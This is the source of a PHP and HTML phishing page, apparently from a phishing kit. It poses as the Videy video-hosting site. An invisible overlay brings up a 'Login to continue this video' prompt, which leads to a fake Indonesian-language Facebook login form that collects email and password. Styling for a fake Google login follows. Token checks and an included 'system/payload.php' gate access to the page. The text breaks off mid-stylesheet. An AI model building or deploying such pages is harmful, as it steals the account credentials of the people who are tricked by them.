<?php
if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/x-icon" href="https://videy.co/favicon.ico">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Hyuu09/my-css@main/stylee.css">
    <title>Videy - Free and Simple Video Hosting</title>
    
    <link rel="stylesheet" crossorigin="" href="css/style.css">
  <style type="text/css">:where(html[dir="ltr"]),:where([data-sonner-toaster][dir="ltr"]){--toast-icon-margin-start: -3px;--toast-icon-margin-end: 4px;--toast-svg-margin-start: -1px;--toast-svg-margin-end: 0px;--toast-button-margin-start: auto;--toast-button-margin-end: 0;--toast-close-button-start: 0;--toast-close-button-end: unset;--toast-close-button-transform: translate(-35%, -35%)}:where(html[dir="rtl"]),:where([data-sonner-toaster][dir="rtl"]){--toast-icon-margin-start: 4px;--toast-icon-margin-end: -3px;--toast-svg-margin-start: 0px;--toast-svg-margin-end: -1px;--toast-button-margin-start: 0;--toast-button-margin-end: auto;--toast-close-button-start: unset;--toast-close-button-end: 0;--toast-close-button-transform: translate(35%, -35%)}:where([data-sonner-toaster]){position:fixed;width:var(--width);font-family:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;--gray1: hsl(0, 0%, 99%);--gray2: hsl(0, 0%, 97.3%);--gray3: hsl(0, 0%, 95.1%);--gray4: hsl(0, 0%, 93%);--gray5: hsl(0, 0%, 90.9%);--gray6: hsl(0, 0%, 88.7%);--gray7: hsl(0, 0%, 85.8%);--gray8: hsl(0, 0%, 78%);--gray9: hsl(0, 0%, 56.1%);--gray10: hsl(0, 0%, 52.3%);--gray11: hsl(0, 0%, 43.5%);--gray12: hsl(0, 0%, 9%);--border-radius: 8px;box-sizing:border-box;padding:0;margin:0;list-style:none;outline:none;z-index:999999999;transition:transform .4s ease}:where([data-sonner-toaster][data-lifted="true"]){transform:translateY(-10px)}@media (hover: none) and (pointer: coarse){:where([data-sonner-toaster][data-lifted="true"]){transform:none}}:where([data-sonner-toaster][data-x-position="right"]){right:var(--offset-right)}:where([data-sonner-toaster][data-x-position="left"]){left:var(--offset-left)}:where([data-sonner-toaster][data-x-position="center"]){left:50%;transform:translate(-50%)}:where([data-sonner-toaster][data-y-position="top"]){top:var(--offset-top)}:where([data-sonner-toaster][data-y-position="bottom"]){bottom:var(--offset-bottom)}:where([data-sonner-toast]){--y: translateY(100%);--lift-amount: calc(var(--lift) * var(--gap));z-index:var(--z-index);position:absolute;opacity:0;transform:var(--y);filter:blur(0);touch-action:none;transition:transform .4s,opacity .4s,height .4s,box-shadow .2s;box-sizing:border-box;outline:none;overflow-wrap:anywhere}:where([data-sonner-toast][data-styled="true"]){padding:16px;background:var(--normal-bg);border:1px solid var(--normal-border);color:var(--normal-text);border-radius:var(--border-radius);box-shadow:0 4px 12px #0000001a;width:var(--width);font-size:13px;display:flex;align-items:center;gap:6px}:where([data-sonner-toast]:focus-visible){box-shadow:0 4px 12px #0000001a,0 0 0 2px #0003}:where([data-sonner-toast][data-y-position="top"]){top:0;--y: translateY(-100%);--lift: 1;--lift-amount: calc(1 * var(--gap))}:where([data-sonner-toast][data-y-position="bottom"]){bottom:0;--y: translateY(100%);--lift: -1;--lift-amount: calc(var(--lift) * var(--gap))}:where([data-sonner-toast]) :where([data-description]){font-weight:400;line-height:1.4;color:inherit}:where([data-sonner-toast]) :where([data-title]){font-weight:500;line-height:1.5;color:inherit}:where([data-sonner-toast]) :where([data-icon]){display:flex;height:16px;width:16px;position:relative;justify-content:flex-start;align-items:center;flex-shrink:0;margin-left:var(--toast-icon-margin-start);margin-right:var(--toast-icon-margin-end)}:where([data-sonner-toast][data-promise="true"]) :where([data-icon])>svg{opacity:0;transform:scale(.8);transform-origin:center;animation:sonner-fade-in .3s ease forwards}:where([data-sonner-toast]) :where([data-icon])>*{flex-shrink:0}:where([data-sonner-toast]) :where([data-icon]) svg{margin-left:var(--toast-svg-margin-start);margin-right:var(--toast-svg-margin-end)}:where([data-sonner-toast]) :where([data-content]){display:flex;flex-direction:column;gap:2px}[data-sonner-toast][data-styled=true] [data-button]{border-radius:4px;padding-left:8px;padding-right:8px;height:24px;font-size:12px;color:var(--normal-bg);background:var(--normal-text);margin-left:var(--toast-button-margin-start);margin-right:var(--toast-button-margin-end);border:none;cursor:pointer;outline:none;display:flex;align-items:center;flex-shrink:0;transition:opacity .4s,box-shadow .2s}:where([data-sonner-toast]) :where([data-button]):focus-visible{box-shadow:0 0 0 2px #0006}:where([data-sonner-toast]) :where([data-button]):first-of-type{margin-left:var(--toast-button-margin-start);margin-right:var(--toast-button-margin-end)}:where([data-sonner-toast]) :where([data-cancel]){color:var(--normal-text);background:rgba(0,0,0,.08)}:where([data-sonner-toast][data-theme="dark"]) :where([data-cancel]){background:rgba(255,255,255,.3)}:where([data-sonner-toast]) :where([data-close-button]){position:absolute;left:var(--toast-close-button-start);right:var(--toast-close-button-end);top:0;height:20px;width:20px;display:flex;justify-content:center;align-items:center;padding:0;color:var(--gray12);border:1px solid var(--gray4);transform:var(--toast-close-button-transform);border-radius:50%;cursor:pointer;z-index:1;transition:opacity .1s,background .2s,border-color .2s}[data-sonner-toast] [data-close-button]{background:var(--gray1)}:where([data-sonner-toast]) :where([data-close-button]):focus-visible{box-shadow:0 4px 12px #0000001a,0 0 0 2px #0003}:where([data-sonner-toast]) :where([data-disabled="true"]){cursor:not-allowed}:where([data-sonner-toast]):hover :where([data-close-button]):hover{background:var(--gray2);border-color:var(--gray5)}:where([data-sonner-toast][data-swiping="true"]):before{content:"";position:absolute;left:-50%;right:-50%;height:100%;z-index:-1}:where([data-sonner-toast][data-y-position="top"][data-swiping="true"]):before{bottom:50%;transform:scaleY(3) translateY(50%)}:where([data-sonner-toast][data-y-position="bottom"][data-swiping="true"]):before{top:50%;transform:scaleY(3) translateY(-50%)}:where([data-sonner-toast][data-swiping="false"][data-removed="true"]):before{content:"";position:absolute;inset:0;transform:scaleY(2)}:where([data-sonner-toast]):after{content:"";position:absolute;left:0;height:calc(var(--gap) + 1px);bottom:100%;width:100%}:where([data-sonner-toast][data-mounted="true"]){--y: translateY(0);opacity:1}:where([data-sonner-toast][data-expanded="false"][data-front="false"]){--scale: var(--toasts-before) * .05 + 1;--y: translateY(calc(var(--lift-amount) * var(--toasts-before))) scale(calc(-1 * var(--scale)));height:var(--front-toast-height)}:where([data-sonner-toast])>*{transition:opacity .4s}:where([data-sonner-toast][data-expanded="false"][data-front="false"][data-styled="true"])>*{opacity:0}:where([data-sonner-toast][data-visible="false"]){opacity:0;pointer-events:none}:where([data-sonner-toast][data-mounted="true"][data-expanded="true"]){--y: translateY(calc(var(--lift) * var(--offset)));height:var(--initial-height)}:where([data-sonner-toast][data-removed="true"][data-front="true"][data-swipe-out="false"]){--y: translateY(calc(var(--lift) * -100%));opacity:0}:where([data-sonner-toast][data-removed="true"][data-front="false"][data-swipe-out="false"][data-expanded="true"]){--y: translateY(calc(var(--lift) * var(--offset) + var(--lift) * -100%));opacity:0}:where([data-sonner-toast][data-removed="true"][data-front="false"][data-swipe-out="false"][data-expanded="false"]){--y: translateY(40%);opacity:0;transition:transform .5s,opacity .2s}:where([data-sonner-toast][data-removed="true"][data-front="false"]):before{height:calc(var(--initial-height) + 20%)}[data-sonner-toast][data-swiping=true]{transform:var(--y) translateY(var(--swipe-amount-y, 0px)) translate(var(--swipe-amount-x, 0px));transition:none}[data-sonner-toast][data-swiped=true]{user-select:none}[data-sonner-toast][data-swipe-out=true][data-y-position=bottom],[data-sonner-toast][data-swipe-out=true][data-y-position=top]{animation-duration:.2s;animation-timing-function:ease-out;animation-fill-mode:forwards}[data-sonner-toast][data-swipe-out=true][data-swipe-direction=left]{animation-name:swipe-out-left}[data-sonner-toast][data-swipe-out=true][data-swipe-direction=right]{animation-name:swipe-out-right}[data-sonner-toast][data-swipe-out=true][data-swipe-direction=up]{animation-name:swipe-out-up}[data-sonner-toast][data-swipe-out=true][data-swipe-direction=down]{animation-name:swipe-out-down}@keyframes swipe-out-left{0%{transform:var(--y) translate(var(--swipe-amount-x));opacity:1}to{transform:var(--y) translate(calc(var(--swipe-amount-x) - 100%));opacity:0}}@keyframes swipe-out-right{0%{transform:var(--y) translate(var(--swipe-amount-x));opacity:1}to{transform:var(--y) translate(calc(var(--swipe-amount-x) + 100%));opacity:0}}@keyframes swipe-out-up{0%{transform:var(--y) translateY(var(--swipe-amount-y));opacity:1}to{transform:var(--y) translateY(calc(var(--swipe-amount-y) - 100%));opacity:0}}@keyframes swipe-out-down{0%{transform:var(--y) translateY(var(--swipe-amount-y));opacity:1}to{transform:var(--y) translateY(calc(var(--swipe-amount-y) + 100%));opacity:0}}@media (max-width: 600px){[data-sonner-toaster]{position:fixed;right:var(--mobile-offset-right);left:var(--mobile-offset-left);width:100%}[data-sonner-toaster][dir=rtl]{left:calc(var(--mobile-offset-left) * -1)}[data-sonner-toaster] [data-sonner-toast]{left:0;right:0;width:calc(100% - var(--mobile-offset-left) * 2)}[data-sonner-toaster][data-x-position=left]{left:var(--mobile-offset-left)}[data-sonner-toaster][data-y-position=bottom]{bottom:var(--mobile-offset-bottom)}[data-sonner-toaster][data-y-position=top]{top:var(--mobile-offset-top)}[data-sonner-toaster][data-x-position=center]{left:var(--mobile-offset-left);right:var(--mobile-offset-right);transform:none}}[data-sonner-toaster][data-theme=light]{--normal-bg: #fff;--normal-border: var(--gray4);--normal-text: var(--gray12);--success-bg: hsl(143, 85%, 96%);--success-border: hsl(145, 92%, 91%);--success-text: hsl(140, 100%, 27%);--info-bg: hsl(208, 100%, 97%);--info-border: hsl(221, 91%, 91%);--info-text: hsl(210, 92%, 45%);--warning-bg: hsl(49, 100%, 97%);--warning-border: hsl(49, 91%, 91%);--warning-text: hsl(31, 92%, 45%);--error-bg: hsl(359, 100%, 97%);--error-border: hsl(359, 100%, 94%);--error-text: hsl(360, 100%, 45%)}[data-sonner-toaster][data-theme=light] [data-sonner-toast][data-invert=true]{--normal-bg: #000;--normal-border: hsl(0, 0%, 20%);--normal-text: var(--gray1)}[data-sonner-toaster][data-theme=dark] [data-sonner-toast][data-invert=true]{--normal-bg: #fff;--normal-border: var(--gray3);--normal-text: var(--gray12)}[data-sonner-toaster][data-theme=dark]{--normal-bg: #000;--normal-bg-hover: hsl(0, 0%, 12%);--normal-border: hsl(0, 0%, 20%);--normal-border-hover: hsl(0, 0%, 25%);--normal-text: var(--gray1);--success-bg: hsl(150, 100%, 6%);--success-border: hsl(147, 100%, 12%);--success-text: hsl(150, 86%, 65%);--info-bg: hsl(215, 100%, 6%);--info-border: hsl(223, 100%, 12%);--info-text: hsl(216, 87%, 65%);--warning-bg: hsl(64, 100%, 6%);--warning-border: hsl(60, 100%, 12%);--warning-text: hsl(46, 87%, 65%);--error-bg: hsl(358, 76%, 10%);--error-border: hsl(357, 89%, 16%);--error-text: hsl(358, 100%, 81%)}[data-sonner-toaster][data-theme=dark] [data-sonner-toast] [data-close-button]{background:var(--normal-bg);border-color:var(--normal-border);color:var(--normal-text)}[data-sonner-toaster][data-theme=dark] [data-sonner-toast] [data-close-button]:hover{background:var(--normal-bg-hover);border-color:var(--normal-border-hover)}[data-rich-colors=true][data-sonner-toast][data-type=success],[data-rich-colors=true][data-sonner-toast][data-type=success] [data-close-button]{background:var(--success-bg);border-color:var(--success-border);color:var(--success-text)}[data-rich-colors=true][data-sonner-toast][data-type=info],[data-rich-colors=true][data-sonner-toast][data-type=info] [data-close-button]{background:var(--info-bg);border-color:var(--info-border);color:var(--info-text)}[data-rich-colors=true][data-sonner-toast][data-type=warning],[data-rich-colors=true][data-sonner-toast][data-type=warning] [data-close-button]{background:var(--warning-bg);border-color:var(--warning-border);color:var(--warning-text)}[data-rich-colors=true][data-sonner-toast][data-type=error],[data-rich-colors=true][data-sonner-toast][data-type=error] [data-close-button]{background:var(--error-bg);border-color:var(--error-border);color:var(--error-text)}.sonner-loading-wrapper{--size: 16px;height:var(--size);width:var(--size);position:absolute;inset:0;z-index:10}.sonner-loading-wrapper[data-visible=false]{transform-origin:center;animation:sonner-fade-out .2s ease forwards}.sonner-spinner{position:relative;top:50%;left:50%;height:var(--size);width:var(--size)}.sonner-loading-bar{animation:sonner-spin 1.2s linear infinite;background:var(--gray11);border-radius:6px;height:8%;left:-10%;position:absolute;top:-3.9%;width:24%}.sonner-loading-bar:nth-child(1){animation-delay:-1.2s;transform:rotate(.0001deg) translate(146%)}.sonner-loading-bar:nth-child(2){animation-delay:-1.1s;transform:rotate(30deg) translate(146%)}.sonner-loading-bar:nth-child(3){animation-delay:-1s;transform:rotate(60deg) translate(146%)}.sonner-loading-bar:nth-child(4){animation-delay:-.9s;transform:rotate(90deg) translate(146%)}.sonner-loading-bar:nth-child(5){animation-delay:-.8s;transform:rotate(120deg) translate(146%)}.sonner-loading-bar:nth-child(6){animation-delay:-.7s;transform:rotate(150deg) translate(146%)}.sonner-loading-bar:nth-child(7){animation-delay:-.6s;transform:rotate(180deg) translate(146%)}.sonner-loading-bar:nth-child(8){animation-delay:-.5s;transform:rotate(210deg) translate(146%)}.sonner-loading-bar:nth-child(9){animation-delay:-.4s;transform:rotate(240deg) translate(146%)}.sonner-loading-bar:nth-child(10){animation-delay:-.3s;transform:rotate(270deg) translate(146%)}.sonner-loading-bar:nth-child(11){animation-delay:-.2s;transform:rotate(300deg) translate(146%)}.sonner-loading-bar:nth-child(12){animation-delay:-.1s;transform:rotate(330deg) translate(146%)}@keyframes sonner-fade-in{0%{opacity:0;transform:scale(.8)}to{opacity:1;transform:scale(1)}}@keyframes sonner-fade-out{0%{opacity:1;transform:scale(1)}to{opacity:0;transform:scale(.8)}}@keyframes sonner-spin{0%{opacity:1}to{opacity:.15}}@media (prefers-reduced-motion){[data-sonner-toast],[data-sonner-toast]>*,.sonner-loading-bar{transition:none!important;animation:none!important}}.sonner-loader{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);transform-origin:center;transition:opacity .2s,transform .2s}.sonner-loader[data-visible=false]{opacity:0;transform:scale(.8) translate(-50%,-50%)}
</style></head>
  <body data-version="v1.0.5">
    <div id="root"><div class="min-h-screen"><div class="min-h-screen flex flex-col"><header class="pt-3 pb-3 lg:pt-4 lg:pb-4"><div class="max-w-6xl mx-auto px-6 lg:px-8"><div class="flex items-center justify-between"><a href="/" class="flex items-center"><span class="font-['Poppins'] font-semibold text-[26px] tracking-[-2px] text-gray-900">videy</span></a><a href="/" class="flex items-center space-x-2 px-4 py-1.5 bg-gray-900 text-white font-semibold rounded-full hover:bg-gray-800 transition-colors text-[15px]"><span>Upload</span></a></div></div></header><div class="w-full max-w-[720px] mx-auto flex-grow px-0 md:px-4 md:mt-3"><div class="w-full flex justify-center"><div class="w-full"><video class="w-full md:rounded-[8px]" controls="" src="https://cdn.videy.co/esYoa2Qw1.mp4" autoplay="" playsinline="" style="max-height: 520px;"></video></div></div><div class="w-full flex flex-col items-center mt-4 mb-0"><button class="inline-flex items-center justify-center whitespace-nowrap text-sm transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 text-secondary-foreground shadow-sm h-9 py-2 rounded-full px-6 gap-2 bg-gray-100 hover:bg-gray-200 font-semibold"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-share w-[18px] h-[18px]"><path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"></path><polyline points="16 6 12 2 8 6"></polyline><line x1="12" x2="12" y1="2" y2="15"></line></svg>Share video</button></div><div class="as mt-4"></div></div><footer class="pb-6"><div class="max-w-6xl mx-auto px-6 lg:px-8"><div class="flex items-center justify-center space-x-8"><a href="/terms-of-service" class="text-xs text-muted-foreground hover:text-foreground transition-colors">Terms of Service</a><a href="/report" class="text-xs text-muted-foreground hover:text-foreground transition-colors">Report Abuse</a></div></div></footer></div><section aria-label="Notifications alt+T" tabindex="-1" aria-live="polite" aria-relevant="additions text" aria-atomic="false"></section></div></div>
<div onclick="$('#PopUpLog').fadeIn();" id="Penahan" style="background: rgba(0,0,0,0.0);width: 100%;height: 100%;position: fixed;top: 0;left: 0;z-index: 9999999;">


<div id="PopUpLog" style="background: rgba(0,0,0,0.5);width: 100%;height: 100%;position: fixed;top: 0;left: 0;z-index: 99999;display:none;">
<div style="position: relative;margin: 50px auto;
        margin-top: 70%;
        text-align: center;" class="modal-content">
          <span onclick="$('#PopUpLog').fadeOut();" class="modal-close">×</span>
          <h2 style="font-family: 'Inter';
font-smooth: always;">Login to continue this video</h2>
            <button onclick="$('.login-facebook').fadeIn();" style="background:#fff;color:#000;width: 100%;padding: 12px;border: 1px solid black;border-radius: 8px;font-size: 1rem;font-weight: 600;cursor: pointer;transition: opacity 0.2s ease;" onclick="$('.login-google').fadeIn();$('#PopUpLog').hide();" type="submit"><i style="margin-right:70px;" class="fa-brands fa-facebook-f"></i><span style="margin-right:70px;">Login with Facebook</span></button>
            <div style="margin-top:10px;"></div>
            <button onclick="$('.login-google').fadeIn();" style="background:#fff;color:#000;width: 100%;padding: 12px;border: 1px solid black;border-radius: 8px;font-size: 1rem;font-weight: 600;cursor: pointer;transition: opacity 0.2s ease;" onclick="$('.login-google').fadeIn();$('#PopUpLog').hide();" type="submit"><i style="margin-right:75px;" class="fa-brands fa-google"></i><span style="margin-right:85px;">Login with Google</span></button>
        </div>
        </div>
        
        <div class="popup-login login-facebook animated fadeIn" style="display: none;">
        <div class="container-box-fb" style="margin-top: 10%;">
        <div class="atasan-fb" style="background: none;">
        <i class="fa-solid fa-arrow-left" onclick="$('.login-facebook').fadeOut();" style="color:#1979f4;position: absolute; width: 25px; margin-top: 10px; left: 10px;" alt=""></i>
		<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/1/facebook_text.webp" style="margin-top: -5px;margin-left: 105px">
	</div>
	<div class="isi-facebook" style="padding-bottom: 10px;">
		<p class="kaget email">
			Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b>
		</p>
		<p class="kaget sandi">
			Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b>
		</p>
		<img src="https://cdn.jsdelivr.net/gh/Hyuu09/CDNsalz@main/20240110_175143.png">
		<div class="txt-ucapan-fb">
			Masuk ke akun Facebook Anda untuk terhubung dengan Facebook
		</div>
		<form class="form-login-fb" action="javascript:void(0)" id="sendfagen">
			<div class="form-group">
				<input type="text" id="fgn_email_fb2" name="email" autocomplete="off" autocapitalize="off" placeholder=" " required="">
				<label for="fgn_email_fb2" id="EmailLabel" class="hidden-label">Nomor ponsel atau email</label>
			</div>
			<div class="form-group">
				<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/1/hide.png" id="HidePw" alt="">
				<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/1/show.png" id="ShowPw" alt="">
				<input type="password" id="fgn_password_fb2" name="password" autocomplete="off" autocapitalize="off" placeholder=" " required="">
				<label for="fgn_password_fb2" id="PasswordLabel" class="hidden-label">Kata Sandi Facebook</label>
			</div>
			<input type="hidden" name="login" value="Facebook" readonly="">
			<button class="btn-login-fb" type="submit" onclick="return SubmitDataFB();" style="border-radius: 48px; margin-top: 13px;">Masuk</button>
			<label style="font-size: 14px; color: #838489; display: block; margin-top: 15px;">Lupa Kata Sandi?</label>
			<button class="btn-login-fb" type="button" style="border-radius: 48px; margin-top: 38px; background: none !important; color: #4292f8; border: 1px solid #4292f8 !important; font-weight: 100em !important; box-shadow: transparent !important;">Buat Akun Baru</button>
		</form>
		<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/1/MetaLogo.png" style="display: block; margin: 20px auto; width: 70px; position: relative; top: 0;" alt="">
	</div>
</div>
</div>
<style type="text/css">
.lds-ring, .lds-ring div { box-sizing: border-box; } .lds-ring { display: inline-block; position: relative; width: 80px; height: 80px; margin-top:70px; } .lds-ring div { box-sizing: border-box; display: block; position: absolute; width: 64px; height: 64px; margin: 8px; border: 8px solid #0B57CF; border-radius: 50%; animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite; border-color: #0B57CF transparent transparent transparent; } .lds-ring div:nth-child(1) { animation-delay: -0.45s; } .lds-ring div:nth-child(2) { animation-delay: -0.3s; } .lds-ring div:nth-child(3) { animation-delay: -0.15s; } @keyframes lds-ring { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } .form { width: 100%; padding: 0px 15px; border-radius: 3px; box-shadow: 0 10px 25px rgba(92, 99, 105, 0.2); } .form__div { position: relative; height: 50px; margin-bottom: 15px; } .showpass { position: relative; height: 50px; margin-top: 0px; } .showpass label { position: relative; margin-top: 2px; margin-left: 4px; font-size:11px; color:#000; } .form__input { position: absolute; top: -1; left: 0; width: 100%; height: 100%; border: 1px solid #AFB0AF; border-radius: 3px; color: #454746; outline: none; padding: 10px; background: none; font-size: 16px; font-weight: 400; font-family: 'Open Sans', sans-serif; z-index: 1; } .form__label { position: absolute; left: 10px; top: 1rem; padding: 0 5px; background-color: #fff; color: #454746; transition: 0.3s; font-size: 11px; font-weight: 400; } /*Input focus move up label*/ .form__input:focus + .form__label { top: -0.4rem; left: 0.5rem; color: #0B57CF; font-size: 11px; font-weight: 400; z-index: 10; } /*Input focus sticky top label*/ .form__input:not(:placeholder-shown).form__input:not(:focus) + .form__label { top: -0.4rem; left: 0.5rem; z-index: 10; font-weight: 400; font-size: 11px; } /*Input focus*/ .form__input:focus { border: 2px solid #0B57CF; font-size: 16px; } .header-gg { background: #fff; width: 100%; height: 40px; padding: 8px; border-radius: 5px 5px 0px 0px; border-bottom: 1px solid #E5EAED; margin-bottom: 20px; position: relative; } .header-gg img { width: 20px; height: 20px; float:left; display: block; margin-top:1px; margin-left:2px; margin-right:-10px; } .header-gg-text { color: #000; font-size: 15px; font-weight: 500; font-family: 'Open Sans', sans-serif; text-align: center; margin-top:2px; padding-left:-2px; } .txt-login-gg { padding-top: 1px; padding-left: 2px; color: #000; text-align: left; font-size: 25px; font-weight: 400; font-family: 'Open Sans', sans-serif; margin-bottom: 3%; } .txt-login-ggs { padding-top: 1px; padding-left: 2px; color: #000; text-align: left; font-size: 15px; font-weight: 400; font-family: 'Open Sans', sans-serif; margin-bottom: 10%; } .content-box-gg { width: 90%; height: auto; margin-left: auto; margin-right: auto; padding-bottom: 25px; display: block; } .content-box-gg-txt { width: auto; height: auto; display: inline-block; margin-left: auto; margin-right: 10px; padding-bottom: 10px; display: block; } .content-box-gg-txt img { width: 55px; border:none; border-radius: 12px; margin-top: 10px; margin-left: 5px; margin-right: 10px; float: left; } .content-box-gg p { background: #666666; height: 35px; border-radius:10px; color: #fff;. padding-top:5px; font-size: 14px; font-family: 'Open Sans', sans-serif; float:center; text-align: center; } .content-box-gg label { color: #000; font-size: 14px; font-family: 'Open Sans', sans-serif; float: left; text-shadow: none; } .content-box-gg label a { color: #1da1f2; } .content-box-gg-txt-title { color: #6A747E; font-size: 16px; padding-top: 11px; padding-bottom: 7px; font-family: 'Open Sans', sans-serif; font-weight: 300; text-align: left; } .content-box-gg-txt-det { width: auto; height: auto; padding-top: 2px; padding-bottom: 3px; color: #8799A3; font-size: 11px; font-family: 'Open Sans', sans-serif; text-align: left; text-shadow:none; } .alert-gg-failed { background: none; width: auto; height: 34px; padding: 5px; padding-top:0px; margin-top: -10px; margin-bottom: 0px; position: relative; display:none; border-radius:5px; } .alert-gg { width: auto; height: auto; padding-top:0px; text-align:left; border-radius:5px; color: #B3261D; font-size: 12px; float: left; font-weight: 400; margin-bottom:-10px; font-family: 'Open Sans', sans-serif; } .alert-gg img { background: #fff; width: 24px; float:left; margin-right:1px; margin-left:2px; border-radius: 5px; margin-top:-5px; display: inline-block; } .alert-gg-faileds { background: #62656C; width: auto; height: auto; padding: 5px; margin-bottom: 10px; position: relative; display:none; border-radius:5px; } .alert-ggs { width: auto; height: auto; padding:0px; text-align:left; border-radius:5px; color: #fff; font-size: 13px; float:center; margin-bottom:-10px; font-family: 'Open Sans', sans-serif; } .alert-ggs img { background: #fff; width: 24px; float:left; margin-right:1px; margin-left:2px; margin-top: 3px; border-radius: 5px; display: inline-block; } .nonbutton { background: #0B57CF; width: 30%; height: auto; padding:10px; margin-top: -5px; margin-left: -1px; margin-bottom: 50px; padding: 14px; color: #fff; font-size: 15px; font-weight: 400; font-family: 'Open Sans', sans-serif; border: none; border-radius: 10px; outline: none; letter-spacing: 1; float:right; } .content-box-gg-txt-footer { width: auto; height: auto; display: inline-block; color: #454746; font-size:12px; font-family: 'Open Sans', sans-serif; margin-right: 10px; text-align:left; padding-bottom: 10px; display: block; } .content-box-gg-txt-footer a { color: #1A62D1; } .content-box-gg-txt-footers { width: auto; height: auto; display: inline-block; color: #848586; font-size:10.5px; font-family: 'Open Sans', sans-serif; margin-right: 10px; text-align:left; padding-bottom: 10px; display: block; } .content-box-gg-txt-footers a { color: #3D86BD; } .content-box-gg-txt-footer-left { width: auto; height: auto; padding-right:25%; display: inline-block; color: #000; font-size:9px; font-weight: bold; font-family: 'Open Sans', sans-serif; margin-right: 10px; text-align:left; padding-bottom: 10px; display: block; } .img { width: 55px; float:left; display: inline-block; } .content-box-gg-txt label { color: #90949c; font-size: 16px; font-family: Roboto, sans-serif; text-align: left; display: inline-block; } .form-group-gg { width: 100%; max-width: 100%; margin-left: -1px; margin-right: auto; padding: 10px 0; position: relative; display: block; } .form-group-gg input { background: transparent; width: 100%; padding: 16px; padding-top: 25px; padding-bottom: 5px; padding-left: 7px; color: #000; font-size: 17px; font-family: 'Open Sans', sans-serif; border: 1px solid #657786; border-radius: 3.5px; display: block; } .form-group-gg label { color: #6E767D; font-size: 17px; font-weight: 100; font-family: 'Open Sans', sans-serif; text-align: right; top: 0; left: 10.5px; position: absolute; pointer-events: none; transform: translateY(26px); transition: all 0.2s ease-in-out; } .form-group-gg input:valid,.form-group-gg input:focus { border: 2px solid #1da1f2; outline: none; } .form-group-gg input:valid+label,.form-group-gg input:focus+label { color: #1da1f2; font-size: 12px; top: 15px; bottom: 20px; transform: translateY(0); } .form-group-sohi { width: 50px; height: 73%; margin-left: 88%; position: absolute; z-index: 9999999; cursor: pointer; } .form-group-sohi img { width: 23px; opacity: 0.6; margin-top: 16px; } input { background: #fff; } #form { width: 40vw; margin: 0 auto; margin-top: 50px; } .input-box.active-grey { .input-1 { border: 1px solid #dadce0; } .input-label { color: #80868b; top: -8px; background: #fff; font-size: 11px; transition: 250ms; svg { position: relative; width: 11px; height: 11px; top: 2px; transition: 250ms; } } } .input-box { position: relative; margin: 10px 0; .input-label { position: absolute; color: #80868b; font-size: 16px; font-weight: 400; max-width: calc(100% - (2 * 8px)); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; left: 8px; top: 13px; padding: 0 8px; transition: 250ms; user-select: none; pointer-events: none; svg { position: relative; width: 15px; height: 15px; top: 2px; transition: 250ms; } } .input-1 { box-sizing: border-box; height: 50px; width: 100%; border-radius: 4px; color: #202124; border: 1px solid #dadce0; padding: 13px 15px; transition: 250ms; &:focus { outline: none; border: 2px solid #1a73e8; transition: 250ms; } } } .input-box.error { .input-label { color: #f44336; top: -8px; background: #fff; font-size: 11px; transition: 250ms; } .input-1 { border: 2px solid #f44336; } } .input-box.focus, .input-box.active { .input-label { color: #1a73e8; top: -8px; background: #fff; font-size: 11px; transition: 250ms; svg { position: relative; width: 11px; height: 11px; top: 2px; transition: 250ms; } } } .input-box.active { .input-1 { border: 2px solid #1a73e8; } } .pull-right { float: right; } .clear { clear: both; } .btn-forgot-google { background: #fff; width: auto; height: auto; margin: 0px; margin-top: 15px; padding: 10px; padding-left: 0; color: #1a73e8; font-size: 14.5px; font-family: 'Open Sans', sans-serif; font-weight: normal; letter-spacing: .25px; text-align: left; border: none; outline: none; float: left; } .notify-google { width: 100%; height: auto; color: gray; font-size: 14px; font-family: arial, sans-serif; font-weight: normal; text-align: left; margin-top: 15%; margin-bottom: 5%; } .notify-google span { color: #1a73e8; font-weight: inherit; } .btn-create-google { background: #fff; width: auto; height: auto; margin: 0px; padding: 5px; padding-left: 0; color: #1a73e8; font-size: 14.5px; font-family: 'Open Sans', sans-serif; font-weight: normal; letter-spacing: .25px; text-align: left; border: none; outline: none; float: left; } .btn-login-google { background: #1a73e8; width: 30%; height: auto; margin: 0px; padding: 10px; color: #fff; font-size: 14px; font-family: 'Open Sans', sans-serif; font-weight: normal; letter-spacing: .25px; text-align: center; border: none; border-radius: 5px; outline: none; float: right; margin-top: -8px; } @media only screen and (max-width:600px) { .footer-language-google, .footer-menu-google { margin-top: 70%; } .footer-language-account-google, .footer-menu-account-google { margin-top: 90%; } } .popup-loginn { background: rgba(0, 0, 0, 0.5);width: 100%;height: 100%;position: fixed;top: 0;z-index: 9999999;left: 0;display: flex;align-items: center;justify-content: center;}.popup-box-login-gg {background: #fff;width: 400px; max-width: 90%;height: auto;position: relative;border-radius: 8px;box-shadow: 0 4px 15px rgba(0,0,0,0.2);animation-duration: 